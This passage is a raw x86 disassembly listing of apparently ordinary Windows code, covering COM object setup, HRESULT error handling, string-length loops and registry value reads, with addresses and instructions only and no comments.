  404d69:	mov    edi,eax
  404d6b:	test   edi,edi
  404d6d:	js     0x404d7e
  404d6f:	mov    esi,DWORD PTR [ebp-0x25c]
  404d75:	xor    eax,eax
  404d77:	push   eax
  404d78:	call   DWORD PTR ds:0x40a140
  404d7e:	xor    eax,eax
  404d80:	jmp    0x404d87
  404d82:	mov    edi,0x80004003
  404d87:	test   edi,edi
  404d89:	js     0x404e53
  404d8f:	mov    ebx,0x4027b8
  404d94:	mov    DWORD PTR [ebp-0x25c],eax
  404d9a:	jmp    0x404d9e
  404d9c:	xor    eax,eax
  404d9e:	test   edi,edi
  404da0:	js     0x404e4d
  404da6:	push   eax
  404da7:	push   esi
  404da8:	call   DWORD PTR ds:0x40a148
  404dae:	push   DWORD PTR [ebx]
  404db0:	push   eax
  404db1:	call   DWORD PTR ds:0x40a1b4
  404db7:	pop    ecx
  404db8:	pop    ecx
  404db9:	test   eax,eax
  404dbb:	je     0x404e04
  404dbd:	xor    eax,eax
  404dbf:	lea    ecx,[ebp-0x240]
  404dc5:	mov    BYTE PTR [ebp-0x264],al
  404dcb:	push   DWORD PTR [ebp-0x264]
  404dd1:	push   ebx
  404dd2:	call   0x404e81
  404dd7:	lea    eax,[ebp-0x260]
  404ddd:	push   eax
  404dde:	push   DWORD PTR [ebp-0x228]
  404de4:	push   DWORD PTR [ebp-0x240]
  404dea:	push   esi
  404deb:	call   DWORD PTR ds:0x40a138
  404df1:	mov    edi,eax
  404df3:	test   edi,edi
  404df5:	js     0x404e04
  404df7:	push   esi
  404df8:	mov    esi,DWORD PTR [ebp-0x260]
  404dfe:	call   DWORD PTR ds:0x40a140
  404e04:	mov    eax,DWORD PTR [ebp-0x25c]
  404e0a:	add    ebx,0x4
  404e0d:	add    eax,0x4
  404e10:	mov    DWORD PTR [ebp-0x25c],eax
  404e16:	cmp    eax,0xc
  404e19:	jb     0x404d9c
  404e1b:	test   edi,edi
  404e1d:	js     0x404e4d
  404e1f:	xor    ebx,ebx
  404e21:	push   ebx
  404e22:	push   esi
  404e23:	call   DWORD PTR ds:0x40a148
  404e29:	mov    edx,eax
  404e2b:	lea    edi,[edx+0x2]
  404e2e:	mov    cx,WORD PTR [edx]
  404e31:	add    edx,0x2
  404e34:	cmp    cx,bx
  404e37:	jne    0x404e2e
  404e39:	push   DWORD PTR [ebp-0x278]
  404e3f:	sub    edx,edi
  404e41:	push   ecx
  404e42:	sar    edx,1
  404e44:	push   edx
  404e45:	push   eax
  404e46:	call   0x404ebd
  404e4b:	mov    edi,eax
  404e4d:	mov    ebx,DWORD PTR [ebp-0x274]
  404e53:	test   esi,esi
  404e55:	je     0x404e5e
  404e57:	push   esi
  404e58:	call   DWORD PTR ds:0x40a140
  404e5e:	test   ebx,ebx
  404e60:	je     0x404e69
  404e62:	push   ebx
  404e63:	call   DWORD PTR ds:0x40a088
  404e69:	mov    ecx,DWORD PTR [ebp-0x4]
  404e6c:	mov    eax,edi
  404e6e:	pop    edi
  404e6f:	pop    esi
  404e70:	xor    ecx,ebp
  404e72:	pop    ebx
  404e73:	call   0x405d80
  404e78:	mov    esp,ebp
  404e7a:	pop    ebp
  404e7b:	ret    
  404e7c:	int3   
  404e7d:	int3   
  404e7e:	int3   
  404e7f:	int3   
  404e80:	int3   
  404e81:	mov    edi,edi
  404e83:	push   ebp
  404e84:	mov    ebp,esp
  404e86:	mov    eax,DWORD PTR [ebp+0x8]
  404e89:	push   esi
  404e8a:	mov    esi,ecx
  404e8c:	push   edi
  404e8d:	mov    ecx,DWORD PTR [eax]
  404e8f:	mov    edx,ecx
  404e91:	lea    edi,[edx+0x2]
  404e94:	mov    ax,WORD PTR [edx]
  404e97:	add    edx,0x2
  404e9a:	test   ax,ax
  404e9d:	jne    0x404e94
  404e9f:	push   esi
  404ea0:	sub    edx,edi
  404ea2:	lea    eax,[esi+0x4]
  404ea5:	push   eax
  404ea6:	sar    edx,1
  404ea8:	push   edx
  404ea9:	push   ecx
  404eaa:	call   DWORD PTR ds:0x40a13c
  404eb0:	pop    edi
  404eb1:	mov    eax,esi
  404eb3:	pop    esi
  404eb4:	pop    ebp
  404eb5:	ret    0x8
  404eb8:	int3   
  404eb9:	int3   
  404eba:	int3   
  404ebb:	int3   
  404ebc:	int3   
  404ebd:	mov    edi,edi
  404ebf:	push   ebp
  404ec0:	mov    ebp,esp
  404ec2:	push   ecx
  404ec3:	push   ebx
  404ec4:	mov    ebx,DWORD PTR [ebp+0xc]
  404ec7:	push   esi
  404ec8:	push   edi
  404ec9:	mov    edi,DWORD PTR [ebp+0x14]
  404ecc:	lea    eax,[ebx+0x1]
  404ecf:	and    DWORD PTR [edi],0x0
  404ed2:	cmp    eax,ebx
  404ed4:	jb     0x404f22
  404ed6:	and    DWORD PTR [edi],0x0
  404ed9:	lea    ecx,[ebp-0x4]
  404edc:	push   ecx
  404edd:	mov    ecx,eax
  404edf:	call   0x404782
  404ee4:	mov    esi,eax
  404ee6:	test   esi,esi
  404ee8:	js     0x404f27
  404eea:	push   DWORD PTR [ebp-0x4]
  404eed:	call   DWORD PTR ds:0x40a084
  404ef3:	mov    DWORD PTR [edi],eax
  404ef5:	test   eax,eax
  404ef7:	je     0x404f06
  404ef9:	mov    edx,edi
  404efb:	xor    ecx,ecx
  404efd:	call   0x4048d9
  404f02:	mov    esi,eax
  404f04:	jmp    0x404f0b
  404f06:	mov    esi,0x8007000e
  404f0b:	test   esi,esi
  404f0d:	js     0x404f27
  404f0f:	mov    ecx,DWORD PTR [edi]
  404f11:	lea    edx,[ebx+0x1]
  404f14:	sub    esp,0xc
  404f17:	push   ebx
  404f18:	push   DWORD PTR [ebp+0x8]
  404f1b:	call   0x4047bc
  404f20:	jmp    0x404f27
  404f22:	mov    esi,0x80070216
  404f27:	pop    edi
  404f28:	mov    eax,esi
  404f2a:	pop    esi
  404f2b:	pop    ebx
  404f2c:	mov    esp,ebp
  404f2e:	pop    ebp
  404f2f:	ret    0x10
  404f32:	int3   
  404f33:	int3   
  404f34:	int3   
  404f35:	int3   
  404f36:	int3   
  404f37:	mov    edi,edi
  404f39:	push   ebp
  404f3a:	mov    ebp,esp
  404f3c:	sub    esp,0xc
  404f3f:	mov    eax,ds:0x409004
  404f44:	xor    eax,ebp
  404f46:	mov    DWORD PTR [ebp-0x4],eax
  404f49:	and    DWORD PTR [ebp-0xc],0x0
  404f4d:	lea    eax,[ebp-0xc]
  404f50:	push   edi
  404f51:	push   eax
  404f52:	call   DWORD PTR ds:0x40a048
  404f58:	mov    edi,eax
  404f5a:	test   edi,edi
  404f5c:	js     0x404fb8
  404f5e:	mov    eax,DWORD PTR [ebp-0xc]
  404f61:	lea    ecx,[ebp-0x8]
  404f64:	and    DWORD PTR [ebp-0x8],0x0
  404f68:	push   esi
  404f69:	push   ecx
  404f6a:	mov    esi,DWORD PTR [eax]
  404f6c:	push   0x402974
  404f71:	push   eax
  404f72:	mov    ecx,DWORD PTR [esi]
  404f74:	call   DWORD PTR ds:0x40a1ec
  404f7a:	call   DWORD PTR [esi]
  404f7c:	mov    edi,eax
  404f7e:	test   edi,edi
  404f80:	js     0x404f9c
  404f82:	mov    eax,DWORD PTR [ebp-0x8]
  404f85:	push   0x10002
  404f8a:	push   eax
  404f8b:	mov    ecx,DWORD PTR [eax]
  404f8d:	mov    esi,DWORD PTR [ecx+0xc]
  404f90:	mov    ecx,esi
  404f92:	call   DWORD PTR ds:0x40a1ec
  404f98:	call   esi
  404f9a:	mov    edi,eax
  404f9c:	mov    ecx,DWORD PTR [ebp-0x8]
  404f9f:	test   ecx,ecx
  404fa1:	je     0x404fb7
  404fa3:	and    DWORD PTR [ebp-0x8],0x0
  404fa7:	mov    eax,DWORD PTR [ecx]
  404fa9:	push   ecx
  404faa:	mov    esi,DWORD PTR [eax+0x8]
  404fad:	mov    ecx,esi
  404faf:	call   DWORD PTR ds:0x40a1ec
  404fb5:	call   esi
  404fb7:	pop    esi
  404fb8:	lea    ecx,[ebp-0xc]
  404fbb:	call   0x402dd5
  404fc0:	mov    ecx,DWORD PTR [ebp-0x4]
  404fc3:	mov    eax,edi
  404fc5:	xor    ecx,ebp
  404fc7:	pop    edi
  404fc8:	call   0x405d80
  404fcd:	mov    esp,ebp
  404fcf:	pop    ebp
  404fd0:	ret    
  404fd1:	int3   
  404fd2:	int3   
  404fd3:	int3   
  404fd4:	int3   
  404fd5:	int3   
  404fd6:	mov    edi,edi
  404fd8:	push   ebp
  404fd9:	mov    ebp,esp
  404fdb:	sub    esp,0x2d4
  404fe1:	mov    eax,ds:0x409004
  404fe6:	xor    eax,ebp
  404fe8:	mov    DWORD PTR [ebp-0x4],eax
  404feb:	push   ebx
  404fec:	push   esi
  404fed:	push   edi
  404fee:	xor    edi,edi
  404ff0:	lea    eax,[ebp-0x2d4]
  404ff6:	push   edi
  404ff7:	push   edi
  404ff8:	push   0x64
  404ffa:	push   eax
  404ffb:	mov    ebx,0x104
  405000:	lea    eax,[ebp-0x20c]
  405006:	push   ebx
  405007:	push   eax
  405008:	mov    esi,edi
  40500a:	call   DWORD PTR ds:0x40a064
  405010:	test   eax,eax
  405012:	js     0x40506f
  405014:	lea    eax,[ebp-0x20c]
  40501a:	push   eax
  40501b:	call   DWORD PTR ds:0x40a044
  405021:	push   0x4028f8
  405026:	lea    eax,[ebp-0x20c]
  40502c:	push   eax
  40502d:	call   DWORD PTR ds:0x40a040
  405033:	lea    eax,[ebp-0x2d4]
  405039:	push   eax
  40503a:	lea    eax,[ebp-0x20c]
  405040:	push   eax
  405041:	call   DWORD PTR ds:0x40a040
  405047:	push   0x402904
  40504c:	lea    eax,[ebp-0x20c]
  405052:	push   eax
  405053:	call   DWORD PTR ds:0x40a040
  405059:	push   0x2
  40505b:	push   edi
  40505c:	lea    eax,[ebp-0x20c]
  405062:	push   eax
  405063:	call   DWORD PTR ds:0x40a0bc
  405069:	mov    esi,eax
  40506b:	test   esi,esi
  40506d:	jne    0x405098
  40506f:	push   ebx
  405070:	lea    eax,[ebp-0x20c]
  405076:	push   eax
  405077:	push   0x402928
  40507c:	call   DWORD PTR ds:0x40a0d4
  405082:	test   eax,eax
  405084:	je     0x405098
  405086:	push   0x2
  405088:	push   edi
  405089:	lea    eax,[ebp-0x20c]
  40508f:	push   eax
  405090:	call   DWORD PTR ds:0x40a0bc
  405096:	mov    esi,eax
  405098:	mov    ecx,DWORD PTR [ebp-0x4]
  40509b:	mov    eax,esi
  40509d:	pop    edi
  40509e:	pop    esi
  40509f:	xor    ecx,ebp
  4050a1:	pop    ebx
  4050a2:	call   0x405d80
  4050a7:	mov    esp,ebp
  4050a9:	pop    ebp
  4050aa:	ret    
  4050ab:	int3   
  4050ac:	int3   
  4050ad:	int3   
  4050ae:	int3   
  4050af:	int3   
  4050b0:	mov    edi,edi
  4050b2:	push   ebp
  4050b3:	mov    ebp,esp
  4050b5:	push   ecx
  4050b6:	and    DWORD PTR [ebp-0x4],0x0
  4050ba:	push   0xffffffff
  4050bc:	call   DWORD PTR ds:0x40a0fc
  4050c2:	test   eax,eax
  4050c4:	je     0x4050d5
  4050c6:	lea    ecx,[ebp-0x4]
  4050c9:	push   ecx
  4050ca:	push   DWORD PTR [ebp+0x8]
  4050cd:	mov    ecx,eax
  4050cf:	call   DWORD PTR ds:0x40b044
  4050d5:	mov    eax,DWORD PTR [ebp-0x4]
  4050d8:	mov    esp,ebp
  4050da:	pop    ebp
  4050db:	ret    0x8
  4050de:	int3   
  4050df:	int3   
  4050e0:	int3   
  4050e1:	int3   
  4050e2:	int3   
  4050e3:	mov    edi,edi
  4050e5:	push   ebp
  4050e6:	mov    ebp,esp
  4050e8:	sub    esp,0xc
  4050eb:	and    DWORD PTR [ebp-0x4],0x0
  4050ef:	push   ebx
  4050f0:	push   esi
  4050f1:	push   edi
  4050f2:	mov    edi,DWORD PTR [ebp+0xc]
  4050f5:	mov    esi,ecx
  4050f7:	mov    DWORD PTR [ebp-0xc],edx
  4050fa:	mov    DWORD PTR [ebp-0x8],esi
  4050fd:	and    DWORD PTR [edi],0x0
  405100:	call   0x404fd6
  405105:	mov    ebx,eax
  405107:	test   ebx,ebx
  405109:	je     0x405114
  40510b:	mov    DWORD PTR [ebp-0x4],0x1
  405112:	jmp    0x405116
  405114:	mov    ebx,esi
  405116:	push   0x0
  405118:	push   0x405180
  40511d:	push   0x0
  40511f:	push   0x4050b0
  405124:	push   edi
  405125:	call   DWORD PTR ds:0x40b048
  40512b:	mov    esi,eax
  40512d:	test   esi,esi
  40512f:	js     0x405147
  405131:	mov    ecx,DWORD PTR [edi]
  405133:	push   0x400000
  405138:	push   ebx
  405139:	push   DWORD PTR [ebp-0x8]
  40513c:	push   DWORD PTR [ebp-0xc]
  40513f:	call   DWORD PTR ds:0x40b054
  405145:	mov    esi,eax
  405147:	cmp    DWORD PTR [ebp-0x4],0x0
  40514b:	je     0x405154
  40514d:	push   ebx
  40514e:	call   DWORD PTR ds:0x40a0b8
  405154:	test   esi,esi
  405156:	jns    0x405167
  405158:	mov    ecx,DWORD PTR [edi]
  40515a:	test   ecx,ecx
  40515c:	je     0x405167
  40515e:	call   DWORD PTR ds:0x40b04c
  405164:	and    DWORD PTR [edi],0x0
  405167:	pop    edi
  405168:	mov    eax,esi
  40516a:	pop    esi
  40516b:	pop    ebx
  40516c:	mov    esp,ebp
  40516e:	pop    ebp
  40516f:	ret    0x10
  405172:	int3   
  405173:	int3   
  405174:	int3   
  405175:	int3   
  405176:	int3   
  405177:	int3   
  405178:	int3   
  405179:	int3   
  40517a:	int3   
  40517b:	int3   
  40517c:	int3   
  40517d:	int3   
  40517e:	int3   
  40517f:	int3   
  405180:	ret    0x10
  405183:	int3   
  405184:	int3   
  405185:	int3   
  405186:	int3   
  405187:	int3   
  405188:	mov    edi,edi
  40518a:	push   ebp
  40518b:	mov    ebp,esp
  40518d:	push   ecx
  40518e:	mov    eax,DWORD PTR [ebp+0x8]
  405191:	and    eax,0xffff0000
  405196:	mov    DWORD PTR [ebp-0x4],ecx
  405199:	neg    eax
  40519b:	push   ebx
  40519c:	sbb    eax,eax
  40519e:	mov    ebx,edx
  4051a0:	push   esi
  4051a1:	not    eax
  4051a3:	and    eax,DWORD PTR [ebp+0xc]
  4051a6:	push   edi
  4051a7:	push   eax
  4051a8:	push   DWORD PTR [ebp+0x8]
  4051ab:	call   DWORD PTR ds:0x40b020
  4051b1:	mov    edi,eax
  4051b3:	mov    esi,edi
  4051b5:	neg    esi
  4051b7:	sbb    esi,esi
  4051b9:	and    esi,0x7ff8fff2
  4051bf:	add    esi,0x8007000e
  4051c5:	js     0x4051de
  4051c7:	mov    ecx,DWORD PTR [ebp-0x4]
  4051ca:	push   edi
  4051cb:	push   0x1
  4051cd:	push   ebx
  4051ce:	call   DWORD PTR ds:0x40b01c
  4051d4:	mov    ecx,edi
  4051d6:	mov    esi,eax
  4051d8:	call   DWORD PTR ds:0x40b058
  4051de:	pop    edi
  4051df:	mov    eax,esi
  4051e1:	pop    esi
  4051e2:	pop    ebx
  4051e3:	mov    esp,ebp
  4051e5:	pop    ebp
  4051e6:	ret    0x8
  4051e9:	int3   
  4051ea:	int3   
  4051eb:	int3   
  4051ec:	int3   
  4051ed:	int3   
  4051ee:	mov    edi,edi
  4051f0:	push   esi
  4051f1:	push   edi
  4051f2:	push   0x409060
  4051f7:	call   DWORD PTR ds:0x40a120
  4051fd:	cmp    DWORD PTR ds:0x409068,0x0
  405204:	mov    edi,0x400000
  405209:	jne    0x40525a
  40520b:	push   0x1
  40520d:	push   0x1
  40520f:	push   0x1
  405211:	push   edi
  405212:	push   0xe
  405214:	call   DWORD PTR ds:0x40b028
  40521a:	mov    esi,eax
  40521c:	test   esi,esi
  40521e:	js     0x4052bf
  405224:	call   0x40537c
  405229:	mov    esi,eax
  40522b:	test   esi,esi
  40522d:	js     0x40524f
  40522f:	call   DWORD PTR ds:0x40a0e0
  405235:	mov    ds:0x40906c,eax
  40523a:	cmp    eax,0xffffffff
  40523d:	jne    0x40525a
  40523f:	push   DWORD PTR ds:0x409084
  405245:	mov    esi,0x80004005
  40524a:	call   0x405408
  40524f:	push   edi
  405250:	call   DWORD PTR ds:0x40b02c
  405256:	test   esi,esi
  405258:	js     0x4052bf
  40525a:	push   0x10002
  40525f:	call   DWORD PTR ds:0x40b03c
  405265:	mov    esi,eax
  405267:	test   esi,esi
  405269:	js     0x405288
  40526b:	call   0x40545e
  405270:	mov    esi,eax
  405272:	test   esi,esi
  405274:	js     0x40527e
  405276:	inc    DWORD PTR ds:0x409068
  40527c:	jmp    0x405284
  40527e:	call   DWORD PTR ds:0x40b040
  405284:	test   esi,esi
  405286:	jns    0x4052ba
  405288:	cmp    DWORD PTR ds:0x409068,0x0
  40528f:	jne    0x4052b6
  405291:	push   DWORD PTR ds:0x40906c
  405297:	call   DWORD PTR ds:0x40a0f4
  40529d:	push   DWORD PTR ds:0x409084
  4052a3:	or     DWORD PTR ds:0x40906c,0xffffffff
  4052aa:	call   0x405408
  4052af:	push   edi
  4052b0:	call   DWORD PTR ds:0x40b02c
  4052b6:	test   esi,esi
  4052b8:	js     0x4052bf
  4052ba:	call   0x404f37
  4052bf:	push   0x409060
  4052c4:	call   DWORD PTR ds:0x40a128
  4052ca:	pop    edi
  4052cb:	mov    eax,esi
  4052cd:	pop    esi
  4052ce:	ret    0x8
  4052d1:	int3   
  4052d2:	int3   
  4052d3:	int3   
  4052d4:	int3   
  4052d5:	int3   
  4052d6:	mov    edi,edi
  4052d8:	push   esi
  4052d9:	call   0x405362
  4052de:	mov    esi,eax
  4052e0:	test   esi,esi
  4052e2:	je     0x405310
  4052e4:	sub    DWORD PTR [esi+0x4],0x1
  4052e8:	jne    0x405310
  4052ea:	mov    ecx,DWORD PTR [esi]
  4052ec:	call   DWORD PTR ds:0x40b04c
  4052f2:	push   esi
  4052f3:	push   0x0
  4052f5:	call   DWORD PTR ds:0x40a09c
  4052fb:	push   eax
  4052fc:	call   DWORD PTR ds:0x40a0a4
  405302:	push   0x0
  405304:	push   DWORD PTR ds:0x40906c
  40530a:	call   DWORD PTR ds:0x40a0f8
  405310:	call   DWORD PTR ds:0x40b040
  405316:	mov    esi,0x409060
  40531b:	push   esi
  40531c:	call   DWORD PTR ds:0x40a120
  405322:	sub    DWORD PTR ds:0x409068,0x1
  405329:	jne    0x405354
  40532b:	push   DWORD PTR ds:0x40906c
  405331:	call   DWORD PTR ds:0x40a0f4
  405337:	push   DWORD PTR ds:0x409084
  40533d:	or     DWORD PTR ds:0x40906c,0xffffffff
  405344:	call   0x405408
  405349:	push   0x400000
  40534e:	call   DWORD PTR ds:0x40b02c
  405354:	push   esi
  405355:	call   DWORD PTR ds:0x40a128
  40535b:	pop    esi
  40535c:	ret    
  40535d:	int3   
  40535e:	int3   
  40535f:	int3   
  405360:	int3   
  405361:	int3   
  405362:	mov    eax,ds:0x40906c
  405367:	cmp    eax,0xffffffff
  40536a:	jne    0x40536f
  40536c:	xor    eax,eax
  40536e:	ret    
  40536f:	push   eax
  405370:	call   DWORD PTR ds:0x40a0fc
  405376:	ret    
  405377:	int3   
  405378:	int3   
  405379:	int3   
  40537a:	int3   
  40537b:	int3   
  40537c:	mov    edi,edi
  40537e:	push   ebp
  40537f:	mov    ebp,esp
  405381:	push   ecx
  405382:	push   ecx
  405383:	mov    eax,ds:0x409004
  405388:	xor    eax,ebp
  40538a:	mov    DWORD PTR [ebp-0x4],eax
  40538d:	push   esi
  40538e:	push   edi
  40538f:	xor    edi,edi
  405391:	mov    esi,edi
  405393:	cmp    edi,DWORD PTR ds:0x409078
  405399:	jae    0x4053b4
  40539b:	mov    eax,ds:0x409074
  4053a0:	mov    esi,DWORD PTR [eax+edi*4]
  4053a3:	mov    ecx,esi
  4053a5:	call   DWORD PTR ds:0x40a1ec
  4053ab:	call   esi
  4053ad:	mov    esi,eax
  4053af:	inc    edi
  4053b0:	test   esi,esi
  4053b2:	jns    0x405393
  4053b4:	push   0x0
  4053b6:	pop    edi
  4053b7:	test   esi,esi
  4053b9:	js     0x4053f1
  4053bb:	mov    eax,ds:0x409080
  4053c0:	test   eax,eax
  4053c2:	je     0x4053f1
  4053c4:	cmp    edi,DWORD PTR ds:0x409084
  4053ca:	jae    0x4053f1
  4053cc:	mov    esi,DWORD PTR [eax+edi*8]
  4053cf:	mov    ecx,esi
  4053d1:	call   DWORD PTR ds:0x40a1ec
  4053d7:	call   esi
  4053d9:	mov    esi,eax
  4053db:	test   esi,esi
  4053dd:	jns    0x4053e5
  4053df:	push   edi
  4053e0:	call   0x405408
  4053e5:	inc    edi
  4053e6:	test   esi,esi
  4053e8:	js     0x4053f1
  4053ea:	mov    eax,ds:0x409080
  4053ef:	jmp    0x4053c4
  4053f1:	mov    ecx,DWORD PTR [ebp-0x4]
  4053f4:	mov    eax,esi
  4053f6:	pop    edi
  4053f7:	xor    ecx,ebp
  4053f9:	pop    esi
  4053fa:	call   0x405d80
  4053ff:	mov    esp,ebp
  405401:	pop    ebp
  405402:	ret    
  405403:	int3   
  405404:	int3   
  405405:	int3   
  405406:	int3   
  405407:	int3   
  405408:	mov    edi,edi
  40540a:	push   ebp
  40540b:	mov    ebp,esp
  40540d:	push   ecx
  40540e:	mov    eax,ds:0x409004
  405413:	xor    eax,ebp
  405415:	mov    DWORD PTR [ebp-0x4],eax
  405418:	mov    eax,ds:0x409080
  40541d:	test   eax,eax
  40541f:	je     0x405449
  405421:	push   esi
  405422:	xor    esi,esi
  405424:	cmp    DWORD PTR [ebp+0x8],esi
  405427:	jbe    0x405448
  405429:	push   edi
  40542a:	mov    edi,DWORD PTR [eax+esi*8+0x4]
  40542e:	test   edi,edi
  405430:	je     0x405441
  405432:	mov    ecx,edi
  405434:	call   DWORD PTR ds:0x40a1ec
  40543a:	call   edi
  40543c:	mov    eax,ds:0x409080
  405441:	inc    esi
  405442:	cmp    esi,DWORD PTR [ebp+0x8]
  405445:	jb     0x40542a
  405447:	pop    edi
  405448:	pop    esi
  405449:	mov    ecx,DWORD PTR [ebp-0x4]
  40544c:	xor    ecx,ebp
  40544e:	call   0x405d80
  405453:	mov    esp,ebp
  405455:	pop    ebp
  405456:	ret    0x4
  405459:	int3   
  40545a:	int3   
  40545b:	int3   
  40545c:	int3   
  40545d:	int3   
  40545e:	mov    edi,edi
  405460:	push   ebp
  405461:	mov    ebp,esp
  405463:	mov    eax,ds:0x40906c
  405468:	sub    esp,0xc
  40546b:	push   esi
  40546c:	cmp    eax,0xffffffff
  40546f:	jne    0x40547b
  405471:	mov    esi,0x80004005
  405476:	jmp    0x40558e
  40547b:	push   eax
  40547c:	xor    esi,esi
  40547e:	call   DWORD PTR ds:0x40a0fc
  405484:	test   eax,eax
  405486:	je     0x405490
  405488:	inc    DWORD PTR [eax+0x4]
  40548b:	jmp    0x40558e
  405490:	push   edi
  405491:	push   0x8
  405493:	push   0x8
  405495:	call   DWORD PTR ds:0x40a09c
  40549b:	push   eax
  40549c:	call   DWORD PTR ds:0x40a0a0
  4054a2:	mov    edi,eax
  4054a4:	mov    esi,edi
  4054a6:	neg    esi
  4054a8:	sbb    esi,esi
  4054aa:	and    esi,0x7ff8fff2
  4054b0:	add    esi,0x8007000e
  4054b6:	js     0x40558d
  4054bc:	mov    eax,ds:0x409070
  4054c1:	xor    ecx,ecx
  4054c3:	test   BYTE PTR ds:0x409064,0x1
  4054ca:	mov    DWORD PTR [ebp-0xc],eax
  4054cd:	mov    DWORD PTR [ebp-0x4],ecx
  4054d0:	push   ecx
  4054d1:	je     0x4054e9
  4054d3:	push   ecx
  4054d4:	lea    ecx,[ebp-0x4]
  4054d7:	mov    edx,eax
  4054d9:	push   ecx
  4054da:	push   ecx
  4054db:	mov    ecx,0x400000
  4054e0:	call   0x4050e3
  4054e5:	mov    esi,eax
  4054e7:	jmp    0x405531
  4054e9:	push   0x405180
  4054ee:	push   ecx
  4054ef:	push   ecx
  4054f0:	lea    eax,[ebp-0x8]
  4054f3:	mov    DWORD PTR [ebp-0x4],ecx
  4054f6:	push   eax
  4054f7:	call   DWORD PTR ds:0x40b048
  4054fd:	mov    esi,eax
  4054ff:	test   esi,esi
  405501:	js     0x40556b
  405503:	mov    ecx,DWORD PTR [ebp-0x8]
  405506:	mov    eax,0x400000
  40550b:	push   eax
  40550c:	push   eax
  40550d:	mov    eax,DWORD PTR [ebp-0xc]
  405510:	movzx  eax,ax
  405513:	push   eax
  405514:	call   DWORD PTR ds:0x40b050
  40551a:	mov    esi,eax
  40551c:	test   esi,esi
  40551e:	js     0x405528
  405520:	mov    eax,DWORD PTR [ebp-0x8]
  405523:	mov    DWORD PTR [ebp-0x4],eax
  405526:	jmp    0x405531
  405528:	mov    ecx,DWORD PTR [ebp-0x8]
  40552b:	call   DWORD PTR ds:0x40b04c
  405531:	test   esi,esi
  405533:	js     0x40556b
  405535:	mov    eax,DWORD PTR [ebp-0x4]
  405538:	push   edi
  405539:	mov    DWORD PTR [edi],eax
  40553b:	mov    DWORD PTR [edi+0x4],0x1
  405542:	push   DWORD PTR ds:0x40906c
  405548:	call   DWORD PTR ds:0x40a0f8
  40554e:	mov    esi,eax
  405550:	neg    esi
  405552:	sbb    esi,esi
  405554:	and    esi,0x7fffbffb
  40555a:	add    esi,0x80004005
  405560:	jns    0x40558d
  405562:	mov    ecx,DWORD PTR [ebp-0x4]
  405565:	call   DWORD PTR ds:0x40b04c
  40556b:	test   edi,edi
  40556d:	je     0x40557f
  40556f:	push   edi
  405570:	push   0x0
  405572:	call   DWORD PTR ds:0x40a09c
  405578:	push   eax
  405579:	call   DWORD PTR ds:0x40a0a4
  40557f:	push   0x0
  405581:	push   DWORD PTR ds:0x40906c
  405587:	call   DWORD PTR ds:0x40a0f8
  40558d:	pop    edi
  40558e:	mov    eax,esi
  405590:	pop    esi
  405591:	mov    esp,ebp
  405593:	pop    ebp
  405594:	ret    
  405595:	int3   
  405596:	int3   
  405597:	int3   
  405598:	int3   
  405599:	int3   
  40559a:	mov    edi,edi
  40559c:	push   ebp
  40559d:	mov    ebp,esp
  40559f:	push   ecx
  4055a0:	push   ebx
  4055a1:	xor    ebx,ebx
  4055a3:	push   esi
  4055a4:	mov    esi,ebx
  4055a6:	test   edx,edx
  4055a8:	je     0x4055cd
  4055aa:	cmp    WORD PTR [edx],bx
  4055ad:	je     0x4055cd
  4055af:	push   ebx
  4055b0:	lea    eax,[ebp-0x4]
  4055b3:	push   eax
  4055b4:	push   ebx
  4055b5:	push   0x2
  4055b7:	push   ebx
  4055b8:	push   ebx
  4055b9:	push   ebx
  4055ba:	push   edx
  4055bb:	push   0x80000001
  4055c0:	call   DWORD PTR ds:0x40a10c
  4055c6:	mov    esi,eax
  4055c8:	mov    eax,DWORD PTR [ebp-0x4]
  4055cb:	jmp    0x4055d5
  4055cd:	mov    eax,0x80000001
  4055d2:	mov    DWORD PTR [ebp-0x4],eax
  4055d5:	test   esi,esi
  4055d7:	jne    0x405601
  4055d9:	push   DWORD PTR [ebp+0x14]
  4055dc:	push   DWORD PTR [ebp+0x10]
  4055df:	push   DWORD PTR [ebp+0xc]
  4055e2:	push   ebx
  4055e3:	push   DWORD PTR [ebp+0x8]
  4055e6:	push   eax
  4055e7:	call   DWORD PTR ds:0x40a110
  4055ed:	cmp    DWORD PTR [ebp-0x4],0x80000001
  4055f4:	mov    esi,eax
  4055f6:	je     0x405601
  4055f8:	push   DWORD PTR [ebp-0x4]
  4055fb:	call   DWORD PTR ds:0x40a118
  405601:	mov    eax,esi
  405603:	pop    esi
  405604:	pop    ebx
  405605:	mov    esp,ebp
  405607:	pop    ebp
  405608:	ret    0x10
  40560b:	int3   
  40560c:	int3   
  40560d:	int3   
  40560e:	int3   
  40560f:	int3   
  405610:	mov    edi,edi
  405612:	push   ebp
  405613:	mov    ebp,esp
  405615:	push   ecx
  405616:	lea    eax,[ebp-0x4]
  405619:	mov    DWORD PTR [ebp-0x4],0x4
  405620:	push   eax
  405621:	push   DWORD PTR [ebp+0xc]
  405624:	push   0x0
  405626:	push   0x10
  405628:	push   0x402380
  40562d:	push   0x4023a0
  405632:	push   0x80000001
  405637:	call   DWORD PTR ds:0x40a114
  40563d:	test   eax,eax
  40563f:	jle    0x405649
  405641:	movzx  eax,ax
  405644:	or     eax,0x80070000
  405649:	mov    esp,ebp
  40564b:	pop    ebp
  40564c:	ret    0x8
  40564f:	int3   
  405650:	int3   
  405651:	int3   
  405652:	int3   
  405653:	int3   
  405654:	mov    edi,edi
  405656:	push   ebp
  405657:	mov    ebp,esp
  405659:	push   0x4
  40565b:	lea    eax,[ebp+0xc]
  40565e:	push   eax
  40565f:	push   0x4
  405661:	push   DWORD PTR [ebp+0x8]
  405664:	call   0x40559a
  405669:	test   eax,eax
  40566b:	jle    0x405675
  40566d:	movzx  eax,ax
  405670:	or     eax,0x80070000
  405675:	pop    ebp
  405676:	ret    0x8
  405679:	int3   
  40567a:	int3   
  40567b:	int3   
  40567c:	int3   
  40567d:	int3   
  40567e:	mov    edi,edi
  405680:	push   ebp
  405681:	mov    ebp,esp
  405683:	push   ecx
  405684:	push   ebx
  405685:	push   esi
  405686:	mov    esi,DWORD PTR [ebp+0xc]
  405689:	lea    eax,[ebp-0x4]
  40568c:	push   0x8
  40568e:	pop    ebx
  40568f:	push   eax
  405690:	push   esi
  405691:	push   0x0
  405693:	push   ebx
  405694:	push   0x402450
  405699:	push   0x4023a0
  40569e:	push   0x80000001
  4056a3:	mov    DWORD PTR [ebp-0x4],ebx
  4056a6:	call   DWORD PTR ds:0x40a114
  4056ac:	test   eax,eax
  4056ae:	jle    0x4056ba
  4056b0:	movzx  eax,ax
  4056b3:	or     eax,0x80070000
  4056b8:	test   eax,eax
  4056ba:	js     0x4056ca
